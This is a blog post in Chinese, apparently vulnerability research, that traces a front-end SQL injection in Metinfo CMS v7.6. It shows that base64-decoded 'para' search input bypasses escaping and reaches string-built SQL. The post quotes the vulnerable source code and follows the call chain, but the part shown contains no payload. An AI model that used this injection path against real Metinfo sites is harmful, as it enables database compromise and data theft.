@@ -1,0 +1,442 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+<meta name="viewport"
+      content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
+
+    <meta name="author" content="Meteor_Kai">
+
+
+
+    <meta name="description" content="Just Hack For Fun...">
+
+
+    <meta name="keywords" content="Web exploits bring me great joy!">
+
+
+<title>Metinfo CMS v7.6 前台SQL注入分析 | Meteor_Kai</title>
+
+
+
+    <link rel="icon" href="/favicon.ico">
+
+
+
+
+    <!-- stylesheets list from _config.yml -->
+    
+    <link rel="stylesheet" href="/css/style.css">
+    
+
+
+
+    <!-- scripts list from _config.yml -->
+    
+    <script src="/js/script.js"></script>
+    
+    <script src="/js/tocbot.min.js"></script>
+    
+
+
+
+    
+    
+        <!-- MathJax配置，可通过单美元符号书写行内公式等 -->
+<script type="text/x-mathjax-config">
+    MathJax.Hub.Config({
+    "HTML-CSS": {
+        preferredFont: "TeX",
+        availableFonts: ["STIX","TeX"],
+        linebreaks: { automatic:true },
+        EqnChunk: (MathJax.Hub.Browser.isMobile ? 10 : 50)
+    },
+    tex2jax: {
+        inlineMath: [ ["$", "$"], ["\\(","\\)"] ],
+        processEscapes: true,
+        ignoreClass: "tex2jax_ignore|dno",
+        skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
+    },
+    TeX: {
+        equationNumbers: { autoNumber: "AMS" },
+        noUndefined: { attributes: { mathcolor: "red", mathbackground: "#FFEEEE", mathsize: "90%" } },
+        Macros: { href: "{}" }
+    },
+    messageStyle: "none"
+    });
+</script>
+<!-- 给MathJax元素添加has-jax class -->
+<script type="text/x-mathjax-config">
+    MathJax.Hub.Queue(function() {
+        var all = MathJax.Hub.getAllJax(), i;
+        for(i=0; i < all.length; i += 1) {
+            all[i].SourceElement().parentNode.className += ' has-jax';
+        }
+    });
+</script>
+<!-- 通过连接CDN加载MathJax的js代码 -->
+<script type="text/javascript" async
+        src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.5/MathJax.js?config=TeX-MML-AM_CHTML">
+</script>
+
+
+    
+
+
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+<body>
+    <script>
+        // this function is used to check current theme before page loaded.
+        (() => {
+            const pagebody = document.getElementsByTagName('body')[0]
+
+            function setTheme(status) {
+
+                if (status === 'dark') {
+                    window.sessionStorage.theme = 'dark'
+                    pagebody.classList.add('dark-theme');
+
+                } else if (status === 'light') {
+                    window.sessionStorage.theme = 'light'
+                    pagebody.classList.remove('dark-theme');
+                }
+            };
+
+            setTheme(window.sessionStorage.theme)
+        })();
+    </script>
+
+    <div class="wrapper">
+        <header>
+    <nav class="navbar">
+        <div class="container">
+            <div class="navbar-header header-logo"><a href="/">Meteor_Kai&#39;s Blog</a></div>
+            <div class="menu navbar-right">
+                
+                <a class="menu-item" href="/archives">Posts</a>
+                
+                <a class="menu-item" href="/categories">Categories</a>
+                
+                <a class="menu-item" href="/tags">Tags</a>
+                
+                <a class="menu-item" href="/about">About</a>
+                
+                <a class="menu-item" href="/links">Links</a>
+                
+                
+                <input id="switch_default" type="checkbox" class="switch_default">
+                <label for="switch_default" class="toggleBtn"></label>
+            </div>
+        </div>
+    </nav>
+
+    
+    <nav class="navbar-mobile" id="nav-mobile">
+        <div class="container">
+            <div class="navbar-header">
+                <div>
+                    <a href="/">Meteor_Kai&#39;s Blog</a><a id="mobile-toggle-theme">·&nbsp;Light</a>
+                </div>
+                <div class="menu-toggle" onclick="mobileBtn()">
+                    <svg class="menu-icon" xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="currentColor" d="M4.5 17.27q-.213 0-.356-.145T4 16.768t.144-.356t.356-.143h15q.213 0 .356.144q.144.144.144.357t-.144.356t-.356.143zm0-4.77q-.213 0-.356-.144T4 11.999t.144-.356t.356-.143h15q.213 0 .356.144t.144.357t-.144.356t-.356.143zm0-4.77q-.213 0-.356-.143Q4 7.443 4 7.23t.144-.356t.356-.143h15q.213 0 .356.144T20 7.23t-.144.356t-.356.144z"/></svg>
+                    <svg class="close-icon" xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><!-- Icon from Material Symbols Light by Google - https://github.com/google/material-design-icons/blob/master/LICENSE --><path fill="currentColor" d="m12 12.708l-5.246 5.246q-.14.14-.344.15t-.364-.15t-.16-.354t.16-.354L11.292 12L6.046 6.754q-.14-.14-.15-.344t.15-.364t.354-.16t.354.16L12 11.292l5.246-5.246q.14-.14.345-.15q.203-.01.363.15t.16.354t-.16.354L12.708 12l5.246 5.246q.14.14.15.345q.01.203-.15.363t-.354.16t-.354-.16z"/></svg>
+                </div>
+            </div>
+            <div class="menu" id="mobile-menu">
+                
+                <a class="menu-item" href="/archives">Posts</a>
+                
+                <a class="menu-item" href="/categories">Categories</a>
+                
+                <a class="menu-item" href="/tags">Tags</a>
+                
+                <a class="menu-item" href="/about">About</a>
+                
+                <a class="menu-item" href="/links">Links</a>
+                
+            </div>
+        </div>
+    </nav>
+
+</header>
+<script>
+    var mobileBtn = function f() {
+        var toggleMenu = document.getElementsByClassName("menu-toggle")[0];
+        var mobileMenu = document.getElementById("mobile-menu");
+        if (toggleMenu.classList.contains("active")) {
+            toggleMenu.classList.remove("active")
+            mobileMenu.classList.remove("active")
+        } else {
+            toggleMenu.classList.add("active")
+            mobileMenu.classList.add("active")
+        }
+    }
+</script>
+            <div class="main">
+                <div class="container">
+    
+    
+        <div class="post-toc">
+    <div class="tocbot-list">
+    </div>
+    <div class="tocbot-list-menu">
+        <a class="tocbot-toc-expand" onclick="expand_toc()">Expand all</a>
+        <a onclick="go_top()">Back to top</a>
+        <a onclick="go_bottom()">Go to bottom</a>
+    </div>
+</div>
+
+<script>
+    var tocbot_timer;
+    var DEPTH_MAX = 6; // 为 6 时展开所有
+    var tocbot_default_config = {
+        tocSelector: '.tocbot-list',
+        contentSelector: '.post-content',
+        headingSelector: 'h1, h2, h3, h4, h5',
+        orderedList: false,
+        scrollSmooth: true,
+        onClick: extend_click,
+    };
+
+    function extend_click() {
+        clearTimeout(tocbot_timer);
+        tocbot_timer = setTimeout(function() {
+            tocbot.refresh(obj_merge(tocbot_default_config, {
+                hasInnerContainers: true
+            }));
+        }, 420); // 这个值是由 tocbot 源码里定义的 scrollSmoothDuration 得来的
+    }
+
+    document.ready(function() {
+        tocbot.init(obj_merge(tocbot_default_config, {
+            collapseDepth: 1
+        }));
+    });
+
+    function expand_toc() {
+        var b = document.querySelector('.tocbot-toc-expand');
+        var expanded = b.getAttribute('data-expanded');
+        expanded ? b.removeAttribute('data-expanded') : b.setAttribute('data-expanded', true);
+        tocbot.refresh(obj_merge(tocbot_default_config, {
+            collapseDepth: expanded ? 1 : DEPTH_MAX
+        }));
+        b.innerText = expanded ? 'Expand all' : 'Collapse all';
+    }
+
+    function go_top() {
+        window.scrollTo(0, 0);
+    }
+
+    function go_bottom() {
+        window.scrollTo(0, document.body.scrollHeight);
+    }
+
+    function obj_merge(target, source) {
+        for (var item in source) {
+            if (source.hasOwnProperty(item)) {
+                target[item] = source[item];
+            }
+        }
+        return target;
+    }
+</script>
+    
+
+    
+    <article class="post-wrap">
+        <header class="post-header">
+            <h1 class="post-title">Metinfo CMS v7.6 前台SQL注入分析</h1>
+            
+                <div class="post-meta">
+                    
+                        Author: <a itemprop="author" rel="author" href="/">Meteor_Kai</a>
+                    
+
+                    
+                        <span class="post-time">
+                        Date: <a href="#">September 5, 2026&nbsp;&nbsp;9:44:55</a>
+                        </span>
+                    
+                    
+                        <span class="post-category">
+                    Category:
+                            
+                                <a href="/categories/Web%E5%AE%89%E5%85%A8/">Web安全</a>
+                            
+                        </span>
+                    
+                </div>
+            
+        </header>
+
+        <div class="post-content">
+            <h1 id="7-6版本前台SQL注入"><a href="#7-6版本前台SQL注入" class="headerlink" title="7.6版本前台SQL注入"></a>7.6版本前台SQL注入</h1><p>找到sink处，<code>app/system/parameter/include/class/parameter_label.class.php#get_search_list_sql</code>，发现存在大量的SQL语句拼接，然后直接在后面查询了。我们再看一下进入sink点的条件：<code>$info</code>为字典（<code>$val</code>为恶意payload）。</p>
+<img src="/2026/09/05/Metinfo-CMS-v7-6-%E5%89%8D%E5%8F%B0SQL%E6%B3%A8%E5%85%A5%E5%88%86%E6%9E%90/1.png" class="" title="Pasted image 20260826150409">
+
+<p>全局搜<code>get_search_list_sql</code>。<code>app/system/base/include/class/base_database.class.php#get_list_by_class_sql</code>。</p>
+<img src="/2026/09/05/Metinfo-CMS-v7-6-%E5%89%8D%E5%8F%B0SQL%E6%B3%A8%E5%85%A5%E5%88%86%E6%9E%90/2.png" class="" title="Pasted image 20260826151225">
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//系统参数筛选  </span></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$cond</span>[<span class="string">&#x27;para&#x27;</span>][<span class="string">&#x27;status&#x27;</span>] &amp;&amp; <span class="variable">$cond</span>[<span class="string">&#x27;para&#x27;</span>][<span class="string">&#x27;info&#x27;</span>]) &#123;  </span><br><span class="line">    <span class="variable">$para</span> = load::<span class="title function_ invoke__">sys_class</span>(<span class="string">&#x27;label&#x27;</span>, <span class="string">&#x27;new&#x27;</span>)-&gt;<span class="title function_ invoke__">get</span>(<span class="string">&#x27;parameter&#x27;</span>)-&gt;<span class="title function_ invoke__">get_search_list_sql</span>(<span class="variable">$this</span>-&gt;module, <span class="variable">$cond</span>[<span class="string">&#x27;para&#x27;</span>][<span class="string">&#x27;precision&#x27;</span>], <span class="variable">$cond</span>[<span class="string">&#x27;para&#x27;</span>][<span class="string">&#x27;info&#x27;</span>]);  </span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$para</span> != <span class="string">&#x27;all&#x27;</span>) &#123;  </span><br><span class="line">        <span class="variable">$search</span> .= <span class="string">&quot; OR id IN (<span class="subst">&#123;$para&#125;</span>) &quot;</span>; <span class="comment">//如果以后需要加强字段搜索，就在这里添加代码。  </span></span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>第三个参数是我们需要构造恶意payload的地方，然后我看看进入这段代码的条件：</p>
+<ul>
+<li><code>if (isset($cond[&#39;type&#39;]) &amp;&amp; ($cond[&#39;type&#39;] == &#39;array&#39; || $cond[&#39;type&#39;] == &#39;tag&#39;))</code></li>
+<li><code>if (isset($_M[&#39;form&#39;][&#39;search&#39;]))</code></li>
+</ul>
+<p>上述if语句都是需要成功通过的。这个<code>$cond</code>是<code>get_list_by_class_sql</code>方法的第二个参数。接着我们关注<code>$_M[&#39;form&#39;]</code>，这是什么东西，看上去像是表单提交的东西。</p>
+<p>我们从整个网站的index入口点开始找找看：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line"><span class="comment"># MetInfo Enterprise Content Management System  </span></span><br><span class="line"><span class="comment"># Copyright (C) MetInfo Co.,Ltd (http://www.metinfo.cn). All rights reserved.  </span></span><br><span class="line"><span class="title function_ invoke__">define</span>(<span class="string">&#x27;M_NAME&#x27;</span>, <span class="string">&#x27;index&#x27;</span>);  </span><br><span class="line"><span class="title function_ invoke__">define</span>(<span class="string">&#x27;M_MODULE&#x27;</span>, <span class="string">&#x27;web&#x27;</span>);  </span><br><span class="line"><span class="title function_ invoke__">define</span>(<span class="string">&#x27;M_CLASS&#x27;</span>, <span class="string">&#x27;index&#x27;</span>);  </span><br><span class="line"><span class="title function_ invoke__">define</span>(<span class="string">&#x27;M_ACTION&#x27;</span>, <span class="string">&#x27;doindex&#x27;</span>);  </span><br><span class="line"><span class="keyword">require_once</span> <span class="string">&#x27;./app/system/entrance.php&#x27;</span>;  </span><br><span class="line">  </span><br><span class="line"><span class="comment"># This program is an open source system, commercial use, please consciously to purchase commercial license.  </span></span><br><span class="line"><span class="comment"># Copyright (C) MetInfo Co., Ltd. (http://www.metinfo.cn). All rights reserved.  </span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>看这个路由，我们往<code>app/system/web/index.class.php</code>找。</p>
+<img src="/2026/09/05/Metinfo-CMS-v7-6-%E5%89%8D%E5%8F%B0SQL%E6%B3%A8%E5%85%A5%E5%88%86%E6%9E%90/3.png" class="" title="Pasted image 20260826152508">
+
+<p>后面会直接使用<code>$_M</code>，那么说明它是已经被构造好了的，我们往父类的构造函数找。</p>
+<img src="/2026/09/05/Metinfo-CMS-v7-6-%E5%89%8D%E5%8F%B0SQL%E6%B3%A8%E5%85%A5%E5%88%86%E6%9E%90/4.png" class="" title="Pasted image 20260826152606">
+
+<p>继续跟进。找到<code>common.class.php</code>，里面存在一堆的初始化与加载函数，我们随便跟进几个看看，下面的<code>load_form</code>其实就是跟<code>$_M[&#39;form&#39;]</code>相关的。理解一下这个<code>$_M</code>其实就相当于是MetInfo自己定义的一个全局数组，整个程序运行时的所有状态都存在里面。</p>
+<img src="/2026/09/05/Metinfo-CMS-v7-6-%E5%89%8D%E5%8F%B0SQL%E6%B3%A8%E5%85%A5%E5%88%86%E6%9E%90/5.png" class="" title="Pasted image 20260826152641">
+
+<p>我们先随便进一个看看，发现其中确实是对<code>$_M</code>的一些赋值。</p>
+<img src="/2026/09/05/Metinfo-CMS-v7-6-%E5%89%8D%E5%8F%B0SQL%E6%B3%A8%E5%85%A5%E5%88%86%E6%9E%90/6.png" class="" title="Pasted image 20260826152900">
+
+<p>接下来我们看<code>load_form</code>。这个方法其实就是对<code>$_COOKIE</code>、<code>$_POST</code>、<code>$_GET</code>进行一些处理后存入<code>$_M</code>。</p>
+<img src="/2026/09/05/Metinfo-CMS-v7-6-%E5%89%8D%E5%8F%B0SQL%E6%B3%A8%E5%85%A5%E5%88%86%E6%9E%90/7.png" class="" title="Pasted image 20260826153037">
+
+<p>我们看看是怎么进行处理的。对GET、POST的值进行转义处理（daddslashes），该方法其中也存在sql注入的一些防护。</p>
+<img src="/2026/09/05/Metinfo-CMS-v7-6-%E5%89%8D%E5%8F%B0SQL%E6%B3%A8%E5%85%A5%E5%88%86%E6%9E%90/8.png" class="" title="Pasted image 20260826153346">
+<img src="/2026/09/05/Metinfo-CMS-v7-6-%E5%89%8D%E5%8F%B0SQL%E6%B3%A8%E5%85%A5%E5%88%86%E6%9E%90/9.png" class="" title="Pasted image 20260826153407">
+
+<p>好了，我们回到<code>app/system/base/include/class/base_database.class.php#get_list_by_class_sql</code>。继续找谁调用了这个方法。</p>
+<img src="/2026/09/05/Metinfo-CMS-v7-6-%E5%89%8D%E5%8F%B0SQL%E6%B3%A8%E5%85%A5%E5%88%86%E6%9E%90/10.png" class="" title="Pasted image 20260826153629">
+
+<p><code>$cond</code>是第四个参数，继续找调用。找到<code>app/system/base/include/class/base_label.class.php#get_list_page</code>。</p>
+<img src="/2026/09/05/Metinfo-CMS-v7-6-%E5%89%8D%E5%8F%B0SQL%E6%B3%A8%E5%85%A5%E5%88%86%E6%9E%90/11.png" class="" title="Pasted image 20260826153904">
+
+<p>我们需要关注的是<code>$cond</code>的取值。它来自于<code>$search[&#39;type&#39;]</code>，所以我们先跟进<code>search</code>方法看看。</p>
+<img src="/2026/09/05/Metinfo-CMS-v7-6-%E5%89%8D%E5%8F%B0SQL%E6%B3%A8%E5%85%A5%E5%88%86%E6%9E%90/12.png" class="" title="Pasted image 20260826154157">
+
+<p>这里分别看一下两个方法，都在<code>search_label.class.php</code>中。只有<code>search_info</code>存在对<code>$_M[&#39;form&#39;][&#39;para&#39;]</code>的赋值，而我们先前的传参是<code>$cond[&#39;para&#39;]</code>。所以我们关注<code>search_info</code>方法：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">search_info</span>(<span class="params"></span>)  </span></span><br><span class="line"><span class="function"></span>&#123;  </span><br><span class="line">    <span class="keyword">global</span> <span class="variable">$_M</span>;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$_M</span>[<span class="string">&#x27;form&#x27;</span>][<span class="string">&#x27;search&#x27;</span>]) &#123;  </span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$_M</span>[<span class="string">&#x27;form&#x27;</span>][<span class="string">&#x27;title&#x27;</span>] || <span class="variable">$_M</span>[<span class="string">&#x27;form&#x27;</span>][<span class="string">&#x27;content&#x27;</span>] || <span class="variable">$_M</span>[<span class="string">&#x27;form&#x27;</span>][<span class="string">&#x27;searchword&#x27;</span>]) &#123;  </span><br><span class="line">            <span class="keyword">if</span> (<span class="variable">$_M</span>[<span class="string">&#x27;form&#x27;</span>][<span class="string">&#x27;content&#x27;</span>]) &#123;  </span><br><span class="line">                <span class="variable">$word</span> = <span class="variable">$_M</span>[<span class="string">&#x27;form&#x27;</span>][<span class="string">&#x27;content&#x27;</span>];  </span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;  </span><br><span class="line">                <span class="variable">$word</span> = <span class="variable">$_M</span>[<span class="string">&#x27;form&#x27;</span>][<span class="string">&#x27;searchword&#x27;</span>];  </span><br><span class="line">            &#125;  </span><br><span class="line">            <span class="variable">$type</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">get_search_type</span>(<span class="number">0</span>, <span class="variable">$word</span>);  </span><br><span class="line">            <span class="keyword">return</span> <span class="variable">$type</span>;  </span><br><span class="line">        &#125; <span class="keyword">elseif</span> (<span class="variable">$_M</span>[<span class="string">&#x27;form&#x27;</span>][<span class="string">&#x27;para&#x27;</span>]) &#123;  </span><br><span class="line">            <span class="comment">//$paratmp = json_decode(load::sys_class(&#x27;auth&#x27;, &#x27;new&#x27;)-&gt;decode($_M[&#x27;form&#x27;][&#x27;para&#x27;]), true);  </span></span><br><span class="line">            <span class="variable">$paratmp</span> = <span class="title function_ invoke__">json_decode</span>(<span class="title function_ invoke__">base64_decode</span>(<span class="variable">$_M</span>[<span class="string">&#x27;form&#x27;</span>][<span class="string">&#x27;para&#x27;</span>]), <span class="literal">true</span>);  </span><br><span class="line">            <span class="keyword">foreach</span> (<span class="variable">$paratmp</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$val</span>) &#123;  </span><br><span class="line">                <span class="variable">$para</span>[] = <span class="keyword">array</span>(  </span><br><span class="line">                    <span class="string">&#x27;id&#x27;</span> =&gt; <span class="variable">$key</span>,  </span><br><span class="line">                    <span class="string">&#x27;info&#x27;</span> =&gt; <span class="variable">$val</span>,  </span><br><span class="line">                );  </span><br><span class="line">            &#125;  </span><br><span class="line">            <span class="variable">$type</span> = <span class="keyword">array</span>(  </span><br><span class="line">                <span class="string">&#x27;type&#x27;</span> =&gt; <span class="string">&#x27;array&#x27;</span>,  </span><br><span class="line">                <span class="string">&#x27;title&#x27;</span> =&gt; <span class="keyword">array</span>(  </span><br><span class="line">                    <span class="string">&#x27;status&#x27;</span> =&gt; <span class="number">0</span>,<span class="comment">//title搜索  </span></span><br><span class="line">                ),  </span><br><span class="line">                <span class="string">&#x27;content&#x27;</span> =&gt; <span class="keyword">array</span>(  </span><br><span class="line">                    <span class="string">&#x27;status&#x27;</span> =&gt; <span class="number">0</span>,<span class="comment">//内容搜索  </span></span><br><span class="line">                ),  </span><br><span class="line">                <span class="string">&#x27;tag&#x27;</span> =&gt; <span class="keyword">array</span>(  </span><br><span class="line">                    <span class="string">&#x27;status&#x27;</span> =&gt; <span class="number">0</span>,<span class="comment">//tag搜索  </span></span><br><span class="line">                ),  </span><br><span class="line">                <span class="string">&#x27;specv&#x27;</span> =&gt; <span class="keyword">array</span>(  </span><br><span class="line">                    <span class="string">&#x27;status&#x27;</span> =&gt; <span class="number">0</span>,<span class="comment">//规格搜索  </span></span><br><span class="line">                ),  </span><br><span class="line">                <span class="string">&#x27;para&#x27;</span> =&gt; <span class="keyword">array</span>(  </span><br><span class="line">                    <span class="string">&#x27;status&#x27;</span> =&gt; <span class="number">1</span>,<span class="comment">//系统属性搜索  </span></span><br><span class="line">                    <span class="string">&#x27;precision&#x27;</span> =&gt; <span class="number">0</span>,  </span><br><span class="line">                    <span class="string">&#x27;info&#x27;</span> =&gt; <span class="variable">$para</span>,  </span><br><span class="line">                ),  </span><br><span class="line">            );  </span><br><span class="line">            <span class="keyword">return</span> <span class="variable">$type</span>;  </span><br><span class="line">        &#125; <span class="keyword">elseif</span> (<span class="variable">$_M</span>[<span class="string">&#x27;form&#x27;</span>][<span class="string">&#x27;specv&#x27;</span>] || <span class="variable">$_M</span>[<span class="string">&#x27;form&#x27;</span>][<span class="string">&#x27;price_low&#x27;</span>] || <span class="variable">$_M</span>[<span class="string">&#x27;form&#x27;</span>][<span class="string">&#x27;price_top&#x27;</span>]) &#123;  </span><br><span class="line">            <span class="variable">$shop_search</span> = load::<span class="title function_ invoke__">app_class</span>(<span class="string">&#x27;shop/include/class/shop_search&#x27;</span>, <span class="string">&#x27;new&#x27;</span>);  </span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">method_exists</span>(<span class="variable">$shop_search</span>,<span class="string">&#x27;getSearchType&#x27;</span>)) &#123;  </span><br><span class="line">                <span class="variable">$specv</span> = <span class="variable">$shop_search</span>-&gt;<span class="title function_ invoke__">getSearchType</span>(<span class="variable">$_M</span>[<span class="string">&#x27;form&#x27;</span>][<span class="string">&#x27;specv&#x27;</span>]);    <span class="comment">//new  </span></span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;  </span><br><span class="line">                <span class="variable">$specv</span> = <span class="title function_ invoke__">json_decode</span>(load::<span class="title function_ invoke__">sys_class</span>(<span class="string">&#x27;auth&#x27;</span>, <span class="string">&#x27;new&#x27;</span>)-&gt;<span class="title function_ invoke__">decode</span>(<span class="variable">$_M</span>[<span class="string">&#x27;form&#x27;</span>][<span class="string">&#x27;specv&#x27;</span>]), <span class="literal">true</span>); <span class="comment">//old  </span></span><br><span class="line">            &#125;  </span><br><span class="line">  </span><br><span class="line">             <span class="variable">$type</span> = <span class="keyword">array</span>(  </span><br><span class="line">                <span class="string">&#x27;type&#x27;</span> =&gt; <span class="string">&#x27;array&#x27;</span>,  </span><br><span class="line">                <span class="string">&#x27;title&#x27;</span> =&gt; <span class="keyword">array</span>(  </span><br><span class="line">                    <span class="string">&#x27;status&#x27;</span> =&gt; <span class="number">0</span>,<span class="comment">//开启搜索  </span></span><br><span class="line">                ),  </span><br><span class="line">                <span class="string">&#x27;content&#x27;</span> =&gt; <span class="keyword">array</span>(  </span><br><span class="line">                    <span class="string">&#x27;status&#x27;</span> =&gt; <span class="number">0</span>,<span class="comment">//开启搜索  </span></span><br><span class="line">                ),  </span><br><span class="line">                <span class="string">&#x27;tag&#x27;</span> =&gt; <span class="keyword">array</span>(  </span><br><span class="line">                    <span class="string">&#x27;status&#x27;</span> =&gt; <span class="number">0</span>,<span class="comment">//开启搜索  </span></span><br><span class="line">                ),  </span><br><span class="line">                <span class="string">&#x27;para&#x27;</span> =&gt; <span class="keyword">array</span>(  </span><br><span class="line">                    <span class="string">&#x27;status&#x27;</span> =&gt; <span class="number">0</span>,<span class="comment">//开启搜索  </span></span><br><span class="line">                ),  </span><br><span class="line">                <span class="string">&#x27;specv&#x27;</span> =&gt; <span class="keyword">array</span>(  </span><br><span class="line">                    <span class="string">&#x27;status&#x27;</span> =&gt; <span class="number">1</span>,<span class="comment">//开启搜索  </span></span><br><span class="line">                    <span class="string">&#x27;precision&#x27;</span> =&gt; <span class="number">0</span>,  </span><br><span class="line">                    <span class="string">&#x27;info&#x27;</span> =&gt; <span class="variable">$specv</span>  </span><br><span class="line">                )  </span><br><span class="line">            );  </span><br><span class="line">            <span class="keyword">return</span> <span class="variable">$type</span>;  </span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>要想成功赋值para，我们传参<code>search</code>和<code>para</code>即可。进入的是如下<code>else if</code>部分。这里我们发现para传参是要经过base64解码的，因此之前的sql注入防御全部失效！成功近在咫尺。这里注意一下：我们的恶意payload应该在<code>&#39;id&#39; =&gt; $key</code>，也就是key。我们从最开始追踪一下就知道：<code>$cond -&gt;[&#39;para&#39;] -&gt; [&#39;info&#39;] -&gt; 的值 -&gt; id</code>。</p>
+<img src="/2026/09/05/Metinfo-CMS-v7-6-%E5%89%8D%E5%8F%B0SQL%E6%B3%A8%E5%85%A5%E5%88%86%E6%9E%90/13.png" class="" title="Pasted image 20260826155010">
+
+<p>然后我们回到<code>get_list_page</code>方法，赋值给<code>$search</code>后就一目了然了。继续寻找调用。</p>
+<img src="/2026/09/05/Metinfo-CMS-v7-6-%E5%89%8D%E5%8F%B0SQL%E6%B3%A8%E5%85%A5%E5%88%86%E6%9E%90/14.png" class="" title="Pasted image 20260826155924">
+
+<p>发现存在大量的调用，看了一下，是因为<code>base_label.class.php</code>是父类，下属有一堆子类不存在<code>get_list_page</code>方法，所以调用的是父类的方法，因此可以成功调用。这里我们随便找一个：<code>app/system/job/include/class/job_tag.class.php#_list</code>。</p>
+<img src="/2026/09/05/Metinfo-CMS-v7-6-%E5%89%8D%E5%8F%B0SQL%E6%B3%A8%E5%85%A5%E5%88%86%E6%9E%90/15.png" class="" title="Pasted image 20260826160527">
+
+<p>这里我们全局搜<code>_list</code>，找不到任何直接调用。因为它是被动态分发（反射）调用的。我们全局搜一下<code>call_user_func</code></p>
+<img src="/2026/09/05/Metinfo-CMS-v7-6-%E5%89%8D%E5%8F%B0SQL%E6%B3%A8%E5%85%A5%E5%88%86%E6%9E%90/16.png" class="" title="Pasted image 20260826161512">
+
+<p>这里调用了本对象的<code>_.$tag</code>方法，<code>job_tag</code>的父类其实就是<code>tag</code>类，因此它可以调用到父类的<code>parseTag</code>方法来解析标签。<br>这里的<code>_</code>是直接拼接的，所以我们不可能全局搜到。然后我们再搜一下parseTag看看。会跟进到<code>view_compile</code>类，这是模板编译器。</p>
+<img src="/2026/09/05/Metinfo-CMS-v7-6-%E5%89%8D%E5%8F%B0SQL%E6%B3%A8%E5%85%A5%E5%88%86%E6%9E%90/17.png" class="" title="Pasted image 20260826161911">
+
+<p>既然是标签的解析，这里我们直接全局搜html标签吧，应该是标签中写出了调用方法。找到个完美符合的，<code>action</code>为<code>job.list</code>，也就是调用<code>job_tag</code>的<code>_list</code>方法，<code>_list</code>一眼就是内部的调用，所以此处非常合理。总结一下：看到模板<code>&lt;tag action=&#39;模块.方法&#39;&gt;</code>，就去找<code>app/system/模块/include/class/模块_tag.class.php</code>的<code>_</code>方法。</p>
+<img src="/2026/09/05/Metinfo-CMS-v7-6-%E5%89%8D%E5%8F%B0SQL%E6%B3%A8%E5%85%A5%E5%88%86%E6%9E%90/18.png" class="" title="Pasted image 20260826162203">
+
+<p>接下来我们需要知道哪里对<code>job.php</code>进行了渲染，或者哪里调用了<code>job.php</code>。我们可以直接在job模块的目录下找，也可以全局搜<code>view</code>函数。</p>
+<img src="/2026/09/05/Metinfo-CMS-v7-6-%E5%89%8D%E5%8F%B0SQL%E6%B3%A8%E5%85%A5%E5%88%86%E6%9E%90/19.png" class="" title="Pasted image 20260826163138">
+
+<p>然后我们找<code>job#dojob</code>方法被谁调用。</p>
+<img src="/2026/09/05/Metinfo-CMS-v7-6-%E5%89%8D%E5%8F%B0SQL%E6%B3%A8%E5%85%A5%E5%88%86%E6%9E%90/20.png" class="" title="Pasted image 20260826163423">
+
